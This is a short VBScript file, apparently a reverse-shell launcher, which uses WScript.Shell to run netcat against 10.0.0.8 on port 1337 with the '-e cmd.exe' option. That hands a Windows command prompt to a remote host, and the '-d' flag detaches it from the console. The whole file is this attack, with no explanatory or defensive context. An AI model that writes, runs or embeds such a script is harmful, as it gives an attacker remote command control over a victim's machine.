Set objShell = CreateObject("WScript.Shell")

' Execute the connection
objShell.Exec("nc -d 10.0.0.8 1337 -e cmd.exe")